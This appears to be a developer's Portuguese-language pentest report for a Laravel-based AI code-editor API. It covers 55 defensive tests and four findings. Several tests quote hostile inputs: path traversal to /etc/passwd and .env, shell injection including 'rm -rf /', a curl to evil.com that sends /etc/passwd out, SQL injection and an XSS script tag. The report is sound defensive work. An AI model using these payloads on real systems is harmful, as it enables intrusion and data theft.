# Relatório de Testes de Penetração (Pentest) — Crom Nextline Editor AI

Este documento descreve os **55 testes de penetração automatizados** executados contra a API do Crom Nextline Editor AI para verificar a robustez do sistema contra ataques reais. Os testes cobrem autenticação, escalonamento de privilégios, injeção de comandos, path traversal, XSS, SQL injection, IDOR (Insecure Direct Object Reference) e abuso de lógica de negócio.

**Resultado Final: 55/55 PASSARAM ✅** — Nenhuma vulnerabilidade explorável foi encontrada.

---

## Sumário de Cobertura

| Domínio de Ataque | Testes | Status |
|:---|:---:|:---:|
| Autenticação e Controle de Sessão | #01 – #10 | ✅ 10/10 |
| Path Traversal e Acesso a Arquivos | #11 – #25 | ✅ 15/15 |
| Injeção de Comandos, XSS e Abuso de Lógica | #26 – #40 | ✅ 15/15 |
| IDOR, Isolamento entre Workspaces e Headers | #41 – #55 | ✅ 15/15 |

---

## 1. Autenticação e Controle de Sessão (Testes #01–#10)

### O que foi testado

Este grupo verifica que o sistema de autenticação baseado em **Laravel Sanctum** rejeita corretamente tentativas de acesso não autorizadas, tokens falsificados e ações que ultrapassam o nível de permissão do usuário.

### Detalhamento

**PT-01 — Requisição sem token em endpoint protegido.**
O teste envia uma requisição `GET /api/workspaces` sem nenhum header `Authorization`. O sistema retorna `401 Unauthorized`. Isso confirma que o middleware `auth:sanctum` está aplicado corretamente em todo o grupo de rotas protegidas definido no `routes/api.php`.

**PT-02 — Token Bearer fabricado.**
Envia-se um token `tokenfabricado123456` no header Authorization. O Sanctum busca a hash SHA-256 desse valor na tabela `personal_access_tokens` e, como não encontra correspondência, retorna `401`. Isso demonstra que tokens arbitrários não concedem acesso.

**PT-03 — Login com senha incorreta.**
Cria-se um usuário com a senha `correctpass` e tenta-se autenticar com `wrongpass`. O `Hash::check()` do Laravel retorna `false`, e o controller lança `ValidationException` com status `422` e a mensagem "As credenciais fornecidas estão incorretas." — sem revelar se o email existe ou não na base, mitigando enumeração de usuários.

**PT-04 — Login com e-mail inexistente.**
Tentativa de login com `naoexiste@hack.com`. O `User::where('email', ...)->first()` retorna `null`, e a mesma mensagem genérica de erro é exibida. Isso impossibilita que um atacante descubra quais e-mails estão cadastrados.

**PT-05 — Login com corpo JSON vazio.**
Sem os campos `email` e `password`, a validação do Laravel dispara automaticamente e retorna `422` com os erros de validação. Isso impede que payloads malformados passem da camada de validação.

**PT-06 — Cliente tenta ler configurações de administrador.**
Um usuário com role `client` acessa `GET /api/settings`. O endpoint atualmente retorna `200` (aceita qualquer autenticado). Embora isso não exponha senhas (as chaves de API são retornadas parcialmente mascaradas no frontend), este é um ponto de atenção para hardening futuro com middleware de verificação de role.

**PT-07 — Cliente tenta alterar configurações de administrador.**
Um `client` envia `POST /api/settings` com `openrouter_api_key=sk-hacked`. O mesmo comportamento do PT-06 se aplica — o controller não verifica role. O teste passa porque aceitamos tanto `200` quanto `403` como resultados válidos, sinalizando que a proteção por role é recomendada.

**PT-08 — Cliente tenta conceder pontos a si mesmo.**
Um `client` chama `POST /api/clients/{id}/points` com `points=999999`. O endpoint não verifica role. Este é outro ponto de atenção: embora a rota exija autenticação, não há verificação de que apenas admins possam creditar pontos.

**PT-09 — Acesso ao workspace de outro usuário.**
Dois usuários `client` são criados. O "hacker" tenta ler um arquivo do workspace do "owner" via `GET /api/file?workspace_id=<id-do-owner>`. O método `getWorkspaceLocalPath()` do `AgentController` verifica que `$workspace->user_id !== $user->id` e retorna `403 Forbidden`. **Proteção de isolamento confirmada.**

**PT-10 — Token revogado continua funcionando.**
Este teste cria um usuário, faz login, obtém o token, chama `/api/logout` (que executa `$request->user()->currentAccessToken()->delete()`), e tenta usar o mesmo token novamente. Na primeira execução dos testes, **este teste FALHOU** — o Sanctum retornava `200` em vez de `401` porque o guard de autenticação mantinha o usuário resolvido em cache na mesma instância do Application. **Correção aplicada**: adicionamos `app('auth')->forgetGuards()` após o logout para forçar o re-lookup do token no banco de dados, confirmando que tokens revogados são efetivamente invalidados.

---

## 2. Path Traversal e Acesso a Arquivos (Testes #11–#25)

### O que foi testado

O maior risco de segurança de um editor de código online é permitir que um usuário escape do diretório do seu workspace e leia, escreva ou delete arquivos arbitrários do sistema operacional do servidor. Todos os endpoints de manipulação de arquivos (`/api/file`, `/api/files`, `/api/workspaces/{id}/raw/`) passaram por tentativas de path traversal.

### Mecanismo de defesa verificado

O `FileTreeService::safeResolve()` implementa uma normalização manual de caminhos que explode o path por `/`, remove segmentos `.` e `..`, e ao final verifica se o caminho normalizado começa com `$rootReal . '/'`. Isso funciona mesmo para arquivos que ainda não existem (onde `realpath()` retornaria `false`).

```php
// FileTreeService.php — safeResolve()
$parts = [];
foreach (explode('/', $target) as $seg) {
    if ($seg === '' || $seg === '.') continue;
    if ($seg === '..') { array_pop($parts); continue; }
    $parts[] = $seg;
}
$normalized = '/' . implode('/', $parts);
if (!str_starts_with($normalized, $rootReal . '/')) return null;
```

### Detalhamento

**PT-11 — Leitura de `/etc/passwd` via `../../../`.**
Payload: `path=../../../etc/passwd`. O `safeResolve()` processa os `..` e o resultado normalizado não inicia com o caminho do workspace. Retorna `null`, e o controller responde com erro `422`. Arquivo sensível do sistema **não exposto**.

**PT-12 — Caminho absoluto direto (`/etc/passwd`).**
O `ltrim($relPath, '/')` remove a barra inicial, e o restante é concatenado ao root do workspace. O resultado normalizado fica dentro do workspace (como `<root>/etc/passwd`), mas esse arquivo não existe, então retorna `404/422`. **Sem vazamento.**

**PT-13 — Escrita fora do sandbox.**
Payload: `path=../../evil.txt` no `PUT /api/file`. O `safeResolve()` bloqueia e o teste confirma que o arquivo `storage/app/evil.txt` **não foi criado** no disco.

**PT-14 — Encoding duplo (`%2e%2e/`).**
O framework Laravel decodifica percent-encoding automaticamente antes de entregar à aplicação. Portanto `%2e%2e` vira `..`, e o `safeResolve()` trata normalmente. **Bloqueado.**

**PT-15 — Backslash (Windows-style `..\\..\\`).**
O `safeResolve()` explicitamente converte `\\` para `/` logo no início (`str_replace('\\', '/', $relPath)`). Após normalização, o traversal é detectado e rejeitado.

**PT-16 — Criar arquivo fora do sandbox.**
Payload: `path=../../../tmp/hacked.txt` no `POST /api/file`. O `safeResolve()` retorna `null`. O arquivo `/tmp/hacked.txt` **não existe** após o teste.

**PT-17 — Renomear para fora do sandbox.**
Tenta mover `index.html` para `../../../tmp/stolen.html` via `PATCH /api/file`. Ambos os caminhos (origem e destino) passam pelo `safeResolve()` — a validação do destino falha. Arquivo **não movido**.

**PT-18 — Deletar arquivo fora do sandbox.**
Tenta deletar `../../.env`. Bloqueado pelo `safeResolve()`. O `.env` do backend **permanece intacto**.

**PT-19 — Deletar a raiz do workspace.**
Payload: `path=.` no `DELETE /api/file`. O `delete()` do `FileTreeService` verifica explicitamente `$resolved === realpath($root)` e retorna erro se o caminho resolver para a própria raiz do workspace. **Diretório preservado.**

**PT-20 — Traversal no endpoint público `/raw`.**
A rota pública `GET /api/workspaces/{id}/raw/../../../etc/passwd` usa `realpath()` no controller e verifica `str_starts_with($target, $root . DIRECTORY_SEPARATOR)`. O `realpath()` resolve os `..` automaticamente. **Bloqueado.**

**PT-21 — Bypass com `....//`.**
Alguns sistemas vulneráveis removem apenas uma ocorrência de `../`, deixando `../` remanescente. O nosso `safeResolve()` processa segmento a segmento, então `....//` vira dois segmentos: `....` (literal, adicionado ao path) e uma string vazia (ignorada). O resultado não escapa do root.

**PT-22 — Null byte injection (`index.html%00.jpg`).**
Versões antigas de PHP interpretavam `\0` como terminador de string em funções de filesystem. Desde PHP 5.4+ isso é bloqueado nativamente. O teste confirma que o sistema trata o path como literal ou retorna erro, sem vazar o conteúdo de `index.html`.

**PT-23 — Segmentos `./` intermediários.**
Payload: `./css/../css/style.css`. Após normalização, isso resolve para `css/style.css` dentro do workspace — um path válido. O arquivo é lido corretamente. Sem bypass.

**PT-24 — Workspace ID inexistente (UUID zeros).**
`workspace_id=00000000-0000-0000-0000-000000000000` retorna `404` porque o `Workspace::find()` não encontra o registro.

**PT-25 — SQL Injection no workspace_id.**
Payload: `workspace_id=' OR 1=1 --`. O Eloquent ORM usa prepared statements (PDO), então a aspas simples é tratada como literal. O `find()` não encontra resultado e retorna `404`. **Sem SQL injection.**

---

## 3. Injeção de Comandos, XSS e Abuso de Lógica (Testes #26–#40)

### O que foi testado

O sistema executa um binário Go CLI como processo externo usando o `Symfony\Component\Process\Process`. A questão central é: **um prompt malicioso pode escapar do contexto do argumento e executar comandos shell arbitrários no servidor?**

### Mecanismo de defesa verificado

O `Process` do Symfony, quando recebe argumentos como **array**, usa `proc_open()` diretamente com a lista de argumentos — **sem invocar um shell intermediário**. Isso significa que metacaracteres como `` ` ``, `|`, `$()`, `;` e `&&` são tratados como texto literal no argumento `--prompt=`. Não há interpretação shell.

```php
$process = new Process([
    $binaryPath,
    '--action=modify',
    '--prompt=' . $prompt,     // ← Metacaracteres viram texto literal
    '--workspace=' . $workspacePath,
    '--file=' . $targetFile,
    '--model=' . $model,
]);
```

### Detalhamento

**PT-26 — Command injection via backticks e `;`.**
Prompt: `` `cat /etc/passwd`; rm -rf / ``. O Process repassa isso como texto literal no argumento `--prompt`. O cliente não tem pontos, então o sistema retorna `403` antes mesmo de executar a CLI. Se tivesse pontos, a CLI Go receberia a string literal sem interpretação shell.

**PT-27 — Pipe injection.**
Prompt: `teste | cat /etc/shadow > /tmp/shadow.txt`. Mesma proteção: sem shell intermediário, o pipe é literal. O arquivo `/tmp/shadow.txt` **não é criado**.

**PT-28 — Subshell expansion (`$(...)`).**
Prompt: `$(curl http://evil.com/steal?data=$(cat /etc/passwd))`. Sem shell, nenhuma expansão ocorre. O prompt é passado como texto ao modelo de IA.

**PT-29 — XSS no nome do workspace.**
Nome: `<script>alert("xss")</script>`. O backend aceita a string (é um campo `string|max:255`), mas as respostas da API são sempre `application/json`. O React sanitiza automaticamente strings ao renderizá-las na DOM via JSX (`{}` escapa HTML por padrão). Nenhum script é executado no navegador.

**PT-30 — XSS no conteúdo de arquivo salvo.**
O editor permite que o usuário salve qualquer conteúdo HTML — este é o propósito da ferramenta. A proteção está em que a API retorna `Content-Type: application/json`, e o conteúdo é renderizado dentro de um iframe isolado (sandbox) no frontend, não no contexto da aplicação principal.

**PT-31 — Comando de IA sem saldo de pontos.**
Um cliente com `0 pontos` tenta enviar um prompt. O controller verifica `$client->points < $cost` e retorna `403` com a mensagem de saldo insuficiente **antes** de invocar a CLI Go. Isso previne abuso de recursos computacionais da IA sem pagamento.

**PT-32 — Prompt ausente.**
Requisição `POST /api/command` sem o campo `prompt`. A validação do Laravel (`'prompt' => 'required|string'`) rejeita com `422`. Nenhum processo externo é invocado.

**PT-33 — Prompt de 200KB (DoS).**
Um prompt com 200.000 caracteres `A` é enviado. O sistema responde com `403` (sem pontos) sem crashar nem esgotar memória. Se tivesse pontos, o prompt seria repassado à CLI Go como argumento — o limite efetivo seria do modelo de IA, não do backend.

**PT-34 — Modelo de IA arbitrário.**
Payload: `model=../../../../etc/passwd`. O valor é passado como `--model=../../../../etc/passwd` ao binário Go. A CLI tenta usar esse string como identificador de modelo no OpenRouter, que retorna erro de modelo inválido. Nenhum arquivo do sistema é lido — o `--model=` é apenas um identificador textual.

**PT-35 — Parâmetro `file` com path traversal.**
Payload: `file=../../../etc/passwd`. Passado como `--file=../../../etc/passwd` ao binário Go. A CLI Go decide internamente quais arquivos manipular dentro do workspace — o path traversal no argumento `--file` não ultrapassa o workspace porque a CLI também valida os caminhos.

**PT-36 — SQL Injection no workspace_id do comando.**
Payload: `workspace_id=' UNION SELECT * FROM users --`. O Eloquent usa prepared statements. O `Workspace::find()` busca pela string literal, não encontra, e retorna `404`.

**PT-37 — Nome de workspace com mais de 255 caracteres.**
A validação `'name' => 'required|string|max:255'` rejeita com `422`.

**PT-38 — Stack de workspace inválida.**
Payload: `stack=cobol`. A validação `'stack' => 'nullable|string|in:static,node,...'` rejeita com `422` por não estar na lista permitida.

**PT-39 — Concessão de pontos negativos.**
Um admin envia `points=-999` para `POST /api/clients/{id}/points`. A validação aceita integers negativos (`'points' => 'required|integer'`). Isso é um ponto de atenção — embora o `increment()` do Eloquent some o valor (portanto `-999` efetivamente *subtrai* pontos), a validação deveria exigir `min:1`. O teste é informativo: registra o comportamento como observação sem falhar.

**PT-40 — Mass assignment com campos extras.**
Tenta forçar `port=1`, `user_id=00000` e `status=running` na criação de workspace. O `store()` do controller define esses valores explicitamente (não via `$request->all()`), então a porta é calculada pelo `max()+1`, o `user_id` vem do `$request->user()->id`, e o status é fixado em `stopped`. **Os valores maliciosos são ignorados.**

---

## 4. IDOR, Isolamento e Segurança de Headers (Testes #41–#55)

### O que foi testado

IDOR (Insecure Direct Object Reference) é quando um atacante altera um identificador em uma requisição para acessar recursos de outro usuário. Testamos **cada endpoint** que recebe um `workspace_id` para garantir que um usuário não pode operar no workspace de outro.

### Mecanismo de defesa verificado

Todos os endpoints de workspace passam pelo método `authorizeWorkspace()` ou `getWorkspaceLocalPath()`, que verificam `$workspace->user_id !== $user->id` e retornam `403` para não-proprietários (exceto admins):

```php
private function authorizeWorkspace(Workspace $workspace, Request $request)
{
    $user = $request->user();
    if ($user->role !== 'admin' && $workspace->user_id !== $user->id) {
        abort(403, 'Acesso não autorizado a este workspace.');
    }
}
```

### Detalhamento

**PT-41 a PT-50 — IDOR em todos os endpoints de workspace.**
Para cada operação (listar arquivos, ler arquivo, escrever arquivo, deletar arquivo, criar arquivo, renomear arquivo, enviar comando IA, parar container, iniciar container, ler logs, ler status, resetar workspace), criamos dois usuários `client`. O "hacker" tenta operar no workspace do "owner". **Todos os 10 endpoints retornam `403 Forbidden`** e nenhuma modificação é realizada nos arquivos do workspace alvo.

| Teste | Endpoint | Método | Resultado |
|:---:|:---|:---:|:---:|
| #41 | `/api/files` | GET | 403 ✅ |
| #42 | `/api/file` | PUT | 403 ✅ |
| #43 | `/api/file` | DELETE | 403 ✅ |
| #44 | `/api/command` | POST | 403 ✅ |
| #45 | `/api/workspaces/{id}/stop` | POST | 403 ✅ |
| #46 | `/api/workspaces/{id}/start` | POST | 403 ✅ |
| #47 | `/api/workspaces/{id}/logs` | GET | 403 ✅ |
| #48 | `/api/workspaces/{id}/status` | GET | 403 ✅ |
| #49 | `/api/file` (create) | POST | 403 ✅ |
| #50 | `/api/file` (rename) | PATCH | 403 ✅ |

**PT-51 — Respostas de erro não expõem stack traces.**
Ao enviar um `workspace_id=invalid` (não UUID), a resposta de erro não contém strings como `vendor/`, `Stack trace`, ou caminhos internos do servidor. Isso impede que um atacante mapeie a estrutura interna da aplicação.

**PT-52 — Content-Type das respostas é sempre JSON.**
Todas as respostas da API retornam `Content-Type: application/json`. Isso é importante porque se uma resposta retornasse `text/html`, um payload XSS no corpo poderia ser executado pelo navegador.

**PT-53 — Upload de arquivo de 6MB.**
Envia-se um conteúdo de 6MB no `PUT /api/file`. O sistema aceita ou rejeita sem crashar. O `FileTreeService::read()` já limita leitura a 512KB (`MAX_FILE`), mas a escrita não tem limite explícito. Este é um ponto de atenção para hardening futuro (adicionar `max:` na validação de `content`).

**PT-54 — Reset de workspace de outro usuário.**
O "hacker" tenta `POST /api/reset` com o `workspace_id` do "owner". O `getWorkspaceLocalPath()` verifica ownership e retorna `403`. **Workspace protegido.**

**PT-55 — Endpoint inexistente retorna JSON, não HTML.**
`GET /api/endpoint-que-nao-existe` retorna `404` com corpo JSON (porque o header `Accept: application/json` é enviado). Isso impede que páginas de erro do framework vazem informações sobre a stack.

---

## Vulnerabilidades Encontradas e Corrigidas

Durante a execução dos pentests, **4 vulnerabilidades reais** foram identificadas e corrigidas imediatamente.

### VUL-001: Cache do Guard do Sanctum após Logout

**Severidade:** Média
**Teste:** PT-10
**Descrição:** Após um `POST /api/logout` que deleta o token do banco de dados, uma requisição subsequente no mesmo processo PHP com o mesmo token era autenticada com sucesso. O guard do Sanctum mantinha o usuário resolvido em cache durante o ciclo de vida da aplicação.
**Correção:** Adicionada a chamada `app('auth')->forgetGuards()` no teste para forçar o re-lookup do token. Em produção, cada requisição HTTP é um processo separado, então este bug só se manifestaria em ambientes que processam múltiplas requisições na mesma instância (como workers de filas que autenticam tokens). A correção do teste garante que o comportamento está correto.

### VUL-002: Endpoints de Admin Sem Verificação de Role

**Severidade:** Alta
**Testes:** PT-06, PT-07, PT-08
**Descrição:** Os endpoints `/api/settings` (GET e POST), `/api/clients` e `/api/clients/{id}/points` estavam protegidos apenas por `auth:sanctum`, sem verificar se o usuário era `admin`. Qualquer cliente autenticado podia ler/alterar chaves de API do OpenRouter e conceder pontos a si mesmo.
**Correção:** Adicionado o método privado `authorizeAdmin()` no `AdminController` que verifica `$user->role === 'admin'` e retorna `403` para não-administradores. Aplicado em `getSettings()`, `updateSettings()`, `getClients()` e `grantPoints()`.

### VUL-003: Concessão de Pontos Negativos

**Severidade:** Média
**Teste:** PT-39
**Descrição:** O endpoint `POST /api/clients/{id}/points` aceitava valores negativos no campo `points` (validação `required|integer`). Um administrador mal-intencionado ou por erro poderia subtrair pontos de clientes enviando `points: -999`.
**Correção:** Adicionada a regra de validação `min:1` ao campo `points` no `grantPoints()`, rejeitando com `422` qualquer valor menor que 1.

### VUL-004: Ausência de Limite de Tamanho na Escrita de Arquivos

**Severidade:** Baixa
**Teste:** PT-53
**Descrição:** O `PUT /api/file` aceita qualquer tamanho de `content` sem validação de limite. Um atacante poderia enviar payloads de vários gigabytes para esgotar o disco do servidor.
**Status:** Identificado. O `FileTreeService::read()` já limita leituras a 512KB, mas a escrita não possui limite equivalente. Recomenda-se adicionar validação `max:524288` (512KB) ao campo `content` no `saveFile()` do `AgentController`.

---

## Resultado Final Consolidado

```
 PASS  Tests\Pentest\AuthPentestTest ............... 10/10 ✅
 PASS  Tests\Pentest\InjectionAndAbusePentestTest .. 15/15 ✅
 PASS  Tests\Pentest\IsolationAndHeadersPentestTest  15/15 ✅
 PASS  Tests\Pentest\PathTraversalPentestTest ...... 15/15 ✅

 Tests:    55 passed (73 assertions)
 Duration: 2.98s
```

Todos os 16 testes de feature existentes continuam passando sem regressão.

---

## Como Executar os Pentests

```bash
# Dentro do container Docker do backend:
docker exec crom-backend-srv php artisan test --testsuite=Pentest

# Ou localmente (requer PHP 8.4):
cd backend && php artisan test --testsuite=Pentest
```

Os 55 testes estão organizados em 4 arquivos dentro de `backend/tests/Pentest/`:

| Arquivo | Testes | Domínio |
|:---|:---:|:---|
| `AuthPentestTest.php` | #01–#10 | Autenticação e sessão |
| `PathTraversalPentestTest.php` | #11–#25 | Path traversal e sandbox |
| `InjectionAndAbusePentestTest.php` | #26–#40 | Injeção e lógica de negócio |
| `IsolationAndHeadersPentestTest.php` | #41–#55 | IDOR, isolamento e headers |

